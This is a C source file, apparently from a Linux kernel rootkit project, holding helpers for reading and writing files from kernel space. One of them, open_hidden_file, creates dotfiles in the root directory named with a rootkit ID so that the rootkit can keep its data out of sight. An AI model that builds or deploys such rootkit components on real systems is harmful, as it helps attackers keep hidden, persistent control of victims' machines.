/*======================================================*\
  functions and structs to interact with kernel file I/O
\*======================================================*/

#include <linux/fs.h>
#include <asm/uaccess.h>

extern char ROOTKIT_ID[];
struct kern_file{ //file holding data for file reading/writing
	struct file *fp; //pointer of file
	loff_t pos; //position to write to
	size_t count; //count of the size of the file?
  ssize_t ret; //just a placeholder for when a number is returned
};

static struct kern_file *open_file(char *path, int flags);
static struct kern_file *open_hidden_file(char *filename);
static int file_close(struct kern_file *file);
static int file_read(struct kern_file *file, void *buf);
static int file_write(struct kern_file *file, void *buf, int buf_size);



static struct kern_file *open_file(char *path, int flags){
	//code from https://stackoverflow.com/questions/1184274/read-write-files-within-a-linux-kernel-module
	struct kern_file *file=kzalloc(sizeof(struct kern_file), GFP_KERNEL); //file descriptor
  int err = 0; //error code

  file->fp = filp_open(path, flags, 0666); //opens the file in append mode //UPDATE change permissions from 666
  if (IS_ERR(file->fp)) { //if file doesnt exist
		err = PTR_ERR(file->fp);
		printk("[rootkit][files.c::open_file] ERROR    unable to open file: error code %i\n", err); //DEBUG
		return (struct kern_file*) NULL;
  }
  return file;
}

static struct kern_file *open_hidden_file(char *filename){ //opens file in / prepended with ROOTKIT_ID or creates if doesn't exist
	struct kern_file *hidden_file;
	char *path;
	path = kzalloc(BUFFER_SIZE, GFP_KERNEL);
	sprintf(path, "/.%s%s", ROOTKIT_ID, filename);
	printk("[rootkit][files.c::open_hidden_file] DEBUG    path = %s\n", path); //DEBUG
	hidden_file = open_file(path, O_APPEND | O_RDWR); //opens file in append mode
	if (hidden_file==NULL){ //if file doesn't exist
		printk("[rootkit][files.c::open_hidden_file] DEBUG    file doesn't exist\n"); //DEBUG
		hidden_file = open_file(path, O_CREAT | O_RDWR); //creates file
	}
	if (hidden_file==NULL){ //if file doesn't exist
		printk("[rootkit][files.c::open_hidden_file] ERROR    unable to open/create file\n"); //DEBUG
	}
    return hidden_file; //return file
}

static int file_close(struct kern_file *file){
	filp_close(file->fp, NULL);
	return 0;
}

static int file_read(struct kern_file *file, void *buf){
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = 0;
	kernel_read(file->fp, buf, file->count, &(file->pos));
	return (int) file->count - (int) file->pos; //returns how many bytes not read
}

static int file_write(struct kern_file *file, void *buf, int buf_size){
	//code from https://stackoverflow.com/questions/69633382/using-kernel-read-kernel-write-to-read-input-txts-content-write-it-into-out
	file->pos = file->count;
	file->count+=buf_size;
	file->ret = kernel_write(file->fp, buf, buf_size, &(file->pos)); //writes data to file
	if (file->ret!=buf_size){ //not all bytes writtens
		printk("[rootkit][files.c::file_write] ERROR    unable to write %ld bytes to file: file->ret=%ld   buf_size=%i\n", buf_size-file->ret, file->ret, buf_size);  //DEBUG
		return buf_size-file->ret; //returns number of bytes not written
	}
	return 0;

}
